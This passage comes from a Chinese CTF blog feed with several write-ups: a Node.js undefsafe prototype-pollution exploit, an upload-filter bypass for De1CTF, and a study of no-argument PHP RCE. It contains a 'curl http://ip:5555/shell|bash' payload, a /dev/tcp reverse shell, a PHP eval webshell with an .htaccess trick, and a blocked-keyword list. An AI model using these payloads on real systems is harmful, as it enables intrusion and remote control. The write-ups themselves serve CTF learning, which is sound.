class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><p>咋一看<code>/status</code>中有命令执行，开头遇到了不认识的库。看到114师傅说的一点很有用（114师傅太强了！！），</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">看见奇奇怪怪得库，先谷歌搜索 库名+vuln 除非他出0day题</span><br></pre></td></tr></table></figure><p>搜索之后发现undefsafe库存在原型链污染<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">参考链接</a></p><p>关键代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure><p>找了一遍之后在<code>/edit_note</code>中找类似的地方，id可控</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>在<code>edit_note</code>提交数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;__proto__.author&amp;author&#x3D;curl%20http:&#x2F;&#x2F;ip:5555&#x2F;shell|bash&amp;raw&#x3D;1</span><br></pre></td></tr></table></figure><p>shell中文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;5556 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>监听端口</p><p>然后在<code>/status</code>触发即可拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app@0a80d876cfe5:&#x2F;app$ cat &#x2F;flag</span><br><span class="line">cat &#x2F;flag</span><br><span class="line">flag&#123;0251b48c-6b03-43f7-a799-3e99a77a2c8a&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;青龙组-filejava&quot;&gt;&lt;a href=&quot;#青龙组-filejava&quot; class=&quot;headerlink&quot; title=&quot;青龙组 filejava&quot;&gt;&lt;/a&gt;青龙组 filejava&lt;/h2&gt;&lt;p&gt;上传一个文件后得到下载地址，下载地址可以随意读取文件，读取为目录时报错，得到绝对路径&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;java.io.FileNotFoundException: &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;tomcat&amp;#x2F;webapps&amp;#x2F;ROOT&amp;#x2F;WEB-INF&amp;#x2F;upload&amp;#x2F;15&amp;#x2F;12&amp;#x2F;..&amp;#x2F;..&amp;#x2F;.. (Is a directory)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	java.io.FileInputStream.open0(Native Method)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	java.io.FileInputStream.open(FileInputStream.java:195)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:138)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	java.io.FileInputStream.&amp;lt;init&amp;gt;(FileInputStream.java:93)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cn.abc.servlet.DownloadServlet.doPost(DownloadServlet.java:43)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cn.abc.servlet.DownloadServlet.doGet(DownloadServlet.java:22)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	javax.servlet.http.HttpServlet.service(HttpServlet.java:634)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	javax.servlet.http.HttpServlet.service(HttpServlet.java:741)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="刷题" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="比赛过程" scheme="https://sunny250.github.io/tags/%E6%AF%94%E8%B5%9B%E8%BF%87%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>De1ctf记录</title>
    <link href="https://sunny250.github.io/2020/05/02/De1ctf%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/05/02/De1ctf%E8%AE%B0%E5%BD%95/</id>
    <published>2020-05-02T02:55:23.000Z</published>
    <updated>2020-05-02T02:55:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a><strong>check in</strong></h2><p>打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!</span><br></pre></td></tr></table></figure><p>修改文件名为1.gif，MIME为image/gif</p><p>过滤了ph。不能使用&lt;?php标签。php版本为5.4.16，支持使用php短标签</p><p>上传.htaccess，其中有过滤，使用<code>\</code>换行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1.gif</span><br><span class="line">GIF89a</span><br><span class="line">&lt;?&#x3D;</span><br><span class="line">eval($_POST[cmd]);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;.htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .gif</span><br></pre></td></tr></table></figure><p>然后蚁剑连接，flag在更目录下。</p><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h2 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h2><p>打开题目给了源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox &#x3D; &quot;uploads&#x2F;&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line">if($_POST[&quot;submit&quot;])&#123;</span><br><span class="line">    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check())&#123;</span><br><span class="line">        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123;</span><br><span class="line">            die($_FILES[&quot;file&quot;][&quot;error&quot;]);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $filename&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];</span><br><span class="line">            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);</span><br><span class="line">            echo &quot;save in:&quot; . $sandbox.&quot;&#x2F;&quot; . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;Not Allow!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts &#x3D; array(&quot;php&quot;);</span><br><span class="line">    $ext &#x3D; explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">    $exts &#x3D; trim(end($ext));</span><br><span class="line">    $file_content &#x3D; file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"></span><br><span class="line">    if(!preg_match(&#39;&#x2F;[a-z0-9;~^&#96;&amp;|]&#x2F;is&#39;,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(&#39;&#x2F;\.\.&#x2F;&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123;</span><br><span class="line">          return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;upload&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>抓包查看是php7.2</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;check-in&quot;&gt;&lt;a href=&quot;#check-in&quot; class=&quot;headerlink&quot; title=&quot;check in&quot;&gt;&lt;/a&gt;&lt;strong&gt;check in&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;打开链接是一个文件上传页面，抓包发现服务器是php5.4.16版本。上传一句话木马提示文件类型错误。后缀名不能是php，phtml,php2等之类的。还有MIME过滤，还对内容进行了过滤,不能包含一下字符&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="De1CTF2020" scheme="https://sunny250.github.io/tags/De1CTF2020/"/>
    
  </entry>
  
  <entry>
    <title>无参数RCE的研究</title>
    <link href="https://sunny250.github.io/2020/04/30/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <id>https://sunny250.github.io/2020/04/30/%E6%97%A0%E5%8F%82%E6%95%B0RCE%E7%9A%84%E7%A0%94%E7%A9%B6/</id>
    <published>2020-04-30T14:49:16.000Z</published>
    <updated>2020-04-30T14:49:16.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>在写一道简单的web题目时候遇到一个奇怪的正则表达式，在此记录一下</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;[^\W]+\((?R)?\)&#x2F;</span><br></pre></td></tr></table></figure><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>(?R)是递归匹配整个正则表达式，整个正则能匹配a(b(c(d()))),a(),a(b())这样的表达式，如果里面包含参赛就不能匹配到。</p><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'cmd'</span>];  </span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入参数phpinfo()；成功执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/pic/151.png" alt=""></p><p>传入参数scandir(“.”);没有显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;No_Pram_Rec.php?cmd&#x3D;scandir(&quot;.&quot;);</span><br></pre></td></tr></table></figure><p><img src="/pic/152.png" alt=""></p><p>也就是可以无限套函数，但是函数必须没有参数</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>在skysec师傅的博客里面介绍了几种利用手法。</p><h3 id="1-getenv"><a href="#1-getenv" class="headerlink" title="1. getenv()"></a>1. getenv()</h3><p>getenv()获取的结果是数组，如何获取特定的数组元素是个问题。</p><p>可以使用array_rand() </p><blockquote><p>从数组中取出一个或多个随机的单元，并返回随机条目的一个或多个键。 它使用了伪随机数产生算法，所以不适合密码学场景。</p><p>如果只取出一个，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。 取出数量如果超过 array 的长度，就会导致 <strong><code>E_WARNING</code></strong> 错误，并返回 NULL。</p></blockquote><p>一般想要的内容都是数组的值，不是数组的键名。</p><p>此时可以使用</p><p>array_flip()</p><blockquote><p>交换数组的键名和值</p></blockquote><p>相关的数组操作函数</p><ul><li><p>array_pop() 取最后一个数组</p></li><li><p>Array_values() 返回数组所有值组成的数组（键名是0，1，2，3）</p></li><li><p>array_reverse() 将数组逆序</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> – 将内部指针指向数组中的最后一个元素，并输出键值 （参考来自颖奇师傅博客）</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> – 将内部指针指向数组中的下一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> – 将内部指针指向数组中的上一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> – 将内部指针指向数组中的第一个元素，并输出键值</p></li><li><p><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> – 返回当前元素的键名和键值，并将内部指针向前移动</p></li></ul><h3 id="2-getallheaders"><a href="#2-getallheaders" class="headerlink" title="2.getallheaders()"></a>2.getallheaders()</h3><table><thead><tr><th align="left">版本</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">5.5.7</td><td align="left">此函数可用于 CLI server。</td></tr><tr><td align="left">5.4.0</td><td align="left">此函数可用于 FastCGI。 此前仅在PHP以 Apache 模块方式运行时支持。</td></tr><tr><td align="left">4.3.3</td><td align="left">从 PHP 4.3.3 起，也可在 Netscape/iPlanet/SunONE Web 服务器的 <a href="https://www.php.net/manual/zh/book.nsapi.php" target="_blank" rel="noopener">NSAPI 服务器模块</a>使用此函数。</td></tr><tr><td align="left">4.3.0</td><td align="left">被改名而成为 <a href="https://www.php.net/manual/zh/function.apache-request-headers.php" target="_blank" rel="noopener">apache_request_headers()</a> 的别名。因为此函数仅适用于 Apache 。</td></tr></tbody></table><p>此函数会返回httpheader头部形成一个数组</p><p>在此时可以使用自定义头部。达到rce</p><p><img src="/pic/153.png" alt=""></p><h3 id="3-get-defined-vars"><a href="#3-get-defined-vars" class="headerlink" title="3. get_defined_vars()"></a>3. get_defined_vars()</h3><p>由于部分版本的php只能在apache上运行getallheaders()才有效果。所以当getallheaders()失效时，可以采取本函数。</p><p><img src="/pic/155.png" alt=""></p><p>能返回<code>_GET</code>、<code>_POST</code>、<code>_COOKIE</code>、<code>_FILES</code>数组</p><p>选取<code>_GET</code>进行RCE</p><p><img src="/pic/156.png" alt=""></p><p>尝试<code>_FILES</code>数组（<code>_POST</code>、<code>_COOKIE</code>也是同样的用法）</p><p>通过文件名进行RCE（也可以使用MIME）</p><p>空格会被截断，所以需要进行编码，此处采用base64编码</p><p><img src="/pic/157.png" alt=""></p><h3 id="4-session-id"><a href="#4-session-id" class="headerlink" title="4. session_id()"></a>4. session_id()</h3><p>这里是使用<code>_COOKIE</code>数组，除了直接利用get_defined_vars()，还能利用session_id()</p><blockquote><ul><li><a href="https://www.php.net/manual/zh/function.session-get-cookie-params.php" target="_blank" rel="noopener">session_get_cookie_params</a> — 获取会话 cookie 参数</li><li><a href="https://www.php.net/manual/zh/function.session-id.php" target="_blank" rel="noopener">session_id</a> — 获取/设置当前会话 ID</li><li><a href="https://www.php.net/manual/zh/function.session-name.php" target="_blank" rel="noopener">session_name</a> — 读取/设置会话名称</li><li><a href="https://www.php.net/manual/zh/function.session-start.php" target="_blank" rel="noopener">session_start</a> — 启动新会话或者重用现有会话</li></ul></blockquote><p>经过测试发现PHPSESSID允许字母和数字出现</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;在写一道简单的web题目时候遇到一个奇怪的正则表达式，在此记录一下&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常积累" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E7%A7%AF%E7%B4%AF/"/>
    
    
      <category term="无参数Rec" scheme="https://sunny250.github.io/tags/%E6%97%A0%E5%8F%82%E6%95%B0Rec/"/>
    
  </entry>
  
  <entry>
